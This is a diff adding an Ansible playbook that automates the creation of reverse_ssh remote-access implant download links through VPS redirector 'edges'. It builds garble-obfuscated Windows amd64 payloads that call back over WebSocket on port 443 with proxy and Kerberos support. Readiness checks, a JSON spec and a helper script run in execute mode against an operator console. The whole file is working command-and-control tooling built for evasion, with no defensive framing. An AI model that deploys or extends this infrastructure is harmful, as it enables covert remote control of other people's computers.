@@ -1,0 +1,164 @@
+---
+- name: Generate reverse_ssh links for ready VPS edges
+  hosts: main
+  become: true
+  gather_facts: false
+
+  vars:
+    reverse_logger_dir: /opt/reverse-logger
+    reverse_ssh_link_output_dir: /opt/reverse-logger/generated-links
+    reverse_ssh_console_host: 127.0.0.1
+    reverse_ssh_console_port: 3232
+    reverse_ssh_console_user: root
+    reverse_ssh_console_key: /root/.ssh/reverse_ssh_operator
+    reverse_ssh_console_timeout: 60
+    reverse_ssh_console_command_delay: 1.0
+    reverse_ssh_link_execute: true
+    reverse_ssh_link_force_rotate: false
+    reverse_ssh_link_check_tls_files: true
+    reverse_ssh_link_transports:
+      - wss
+    reverse_ssh_link_platforms:
+      - goos: windows
+        goarch: amd64
+    reverse_ssh_link_external_port: 443
+    reverse_ssh_link_name_template: "{vps_host}-{transport}-{goos}-{goarch}"
+    reverse_ssh_link_garble: true
+    reverse_ssh_link_auto_proxy: true
+    reverse_ssh_link_use_kerberos: true
+    reverse_ssh_link_extra_args: []
+
+  pre_tasks:
+    - name: Validate main link generation variables
+      ansible.builtin.assert:
+        that:
+          - groups['vps_edge'] | default([]) | length > 0
+          - reverse_ssh_console_host | length > 0
+          - reverse_ssh_console_port | int > 0
+          - reverse_ssh_link_output_dir | length > 1
+          - reverse_ssh_link_transports | length > 0
+          - reverse_ssh_link_platforms | length > 0
+          - reverse_ssh_link_name_template | length > 0
+        fail_msg: >-
+          Define a [main] inventory group and at least one vps_edge host before
+          running reverse-ssh-links.yml.
+
+  tasks:
+    - name: Check VPS edge readiness before link generation
+      ansible.builtin.shell: |
+        set -eu
+        test -n "${EXPECTED_DOMAIN}"
+        test -n "${EXPECTED_WS_PATH}"
+        test -n "${EXPECTED_PUSH_PATH}"
+        nginx -t >/dev/null
+        systemctl is-active --quiet nginx
+        systemctl is-active --quiet nginx-edge-forwarder
+        test -f /etc/reverse-logger/nginx-edge-forwarder.env
+        grep -Fx "RSSH_WS_PATH=${EXPECTED_WS_PATH}" /etc/reverse-logger/nginx-edge-forwarder.env >/dev/null
+        grep -Fx "RSSH_PUSH_PATH=${EXPECTED_PUSH_PATH}" /etc/reverse-logger/nginx-edge-forwarder.env >/dev/null
+        if [ "${CHECK_TLS_FILES}" = "1" ]; then
+          test -f "${TLS_CERT_PATH}"
+          test -f "${TLS_KEY_PATH}"
+        fi
+      args:
+        executable: /bin/sh
+      environment:
+        EXPECTED_DOMAIN: "{{ hostvars[item].rssh_domain | default('') }}"
+        EXPECTED_WS_PATH: "{{ hostvars[item].rssh_ws_path | default('') }}"
+        EXPECTED_PUSH_PATH: "{{ hostvars[item].rssh_push_path | default('') }}"
+        CHECK_TLS_FILES: "{{ (reverse_ssh_link_check_tls_files | bool) | ternary('1', '0') }}"
+        TLS_CERT_PATH: "{{ hostvars[item].tls_cert_path | default('/etc/letsencrypt/live/' ~ (hostvars[item].rssh_domain | default('')) ~ '/fullchain.pem') }}"
+        TLS_KEY_PATH: "{{ hostvars[item].tls_key_path | default('/etc/letsencrypt/live/' ~ (hostvars[item].rssh_domain | default('')) ~ '/privkey.pem') }}"
+      loop: "{{ groups['vps_edge'] | default([]) }}"
+      loop_control:
+        label: "{{ item }}"
+      delegate_to: "{{ item }}"
+      become: true
+      register: reverse_ssh_edge_readiness
+      changed_when: false
+      failed_when: false
+      ignore_unreachable: true
+
+    - name: Show VPS edges skipped by readiness checks
+      ansible.builtin.debug:
+        msg: "{{ item.item }} is not ready for link generation: {{ item.stderr | default(item.stdout, true) | default('readiness command failed', true) }}"
+      loop: "{{ reverse_ssh_edge_readiness.results | default([]) }}"
+      loop_control:
+        label: "{{ item.item }}"
+      when: item.rc | default(1) != 0
+
+    - name: Build ready edge list
+      ansible.builtin.set_fact:
+        reverse_ssh_ready_edges: "{{ reverse_ssh_edge_readiness.results | selectattr('rc', 'equalto', 0) | map(attribute='item') | list }}"
+
+    - name: Stop when no VPS edge is ready
+      ansible.builtin.fail:
+        msg: >-
+          No vps_edge host passed readiness checks, so no reverse_ssh links were
+          generated. Run vps-edge.yml first or inspect nginx/nginx-edge-forwarder
+          on the skipped hosts.
+      when: reverse_ssh_ready_edges | length == 0
+
+    - name: Create link generation output directory
+      ansible.builtin.file:
+        path: "{{ reverse_ssh_link_output_dir }}"
+        state: directory
+        mode: "0750"
+
+    - name: Install reverse_ssh link generation helper
+      ansible.builtin.copy:
+        src: "{{ playbook_dir }}/../scripts/reverse_ssh_generate_links.py"
+        dest: "{{ reverse_ssh_link_output_dir }}/reverse_ssh_generate_links.py"
+        mode: "0750"
+
+    - name: Render reverse_ssh link generation specification
+      ansible.builtin.copy:
+        dest: "{{ reverse_ssh_link_output_dir }}/spec.json"
+        mode: "0640"
+        content: |
+          {
+            "output_dir": {{ reverse_ssh_link_output_dir | to_json }},
+            "console": {
+              "host": {{ reverse_ssh_console_host | to_json }},
+              "port": {{ reverse_ssh_console_port | int | to_json }},
+              "user": {{ reverse_ssh_console_user | default('', true) | to_json }},
+              "key": {{ reverse_ssh_console_key | default('', true) | to_json }},
+              "timeout": {{ reverse_ssh_console_timeout | int | to_json }},
+              "command_delay": {{ reverse_ssh_console_command_delay | float | to_json }}
+            },
+            "options": {
+              "force_rotate": {{ reverse_ssh_link_force_rotate | bool | to_json }},
+              "transports": {{ reverse_ssh_link_transports | to_json }},
+              "platforms": {{ reverse_ssh_link_platforms | to_json }},
+              "external_port": {{ reverse_ssh_link_external_port | int | to_json }},
+              "name_template": {{ reverse_ssh_link_name_template | to_json }},
+              "garble": {{ reverse_ssh_link_garble | bool | to_json }},
+              "auto_proxy": {{ reverse_ssh_link_auto_proxy | bool | to_json }},
+              "use_kerberos": {{ reverse_ssh_link_use_kerberos | bool | to_json }},
+              "extra_args": {{ reverse_ssh_link_extra_args | to_json }}
+            },
+            "edges": [
+          {% for vps_host in reverse_ssh_ready_edges %}
+              {
+                "vps_host": {{ vps_host | to_json }},
+                "vps_name": {{ hostvars[vps_host].vps_name | default(vps_host, true) | to_json }},
+                "domain": {{ hostvars[vps_host].rssh_domain | to_json }},
+                "ws_path": {{ hostvars[vps_host].rssh_ws_path | to_json }},
+                "push_path": {{ hostvars[vps_host].rssh_push_path | to_json }},
+                "download_path_prefix": {{ hostvars[vps_host].rssh_download_path_prefix | default('/dl', true) | to_json }}
+              }{% if not loop.last %},{% endif %}
+          {% endfor %}
+            ]
+          }
+
+    - name: Generate reverse_ssh links on main
+      ansible.builtin.command:
+        argv: "{{ ['python3', reverse_ssh_link_output_dir ~ '/reverse_ssh_generate_links.py', '--spec', reverse_ssh_link_output_dir ~ '/spec.json'] + ((reverse_ssh_link_execute | bool) | ternary(['--execute'], [])) }}"
+      register: reverse_ssh_link_generation
+      changed_when: >-
+        reverse_ssh_link_execute | bool and
+        ((reverse_ssh_link_generation.stdout | from_json).created | int > 0)
+
+    - name: Show reverse_ssh link generation result
+      ansible.builtin.debug:
+        var: reverse_ssh_link_generation.stdout
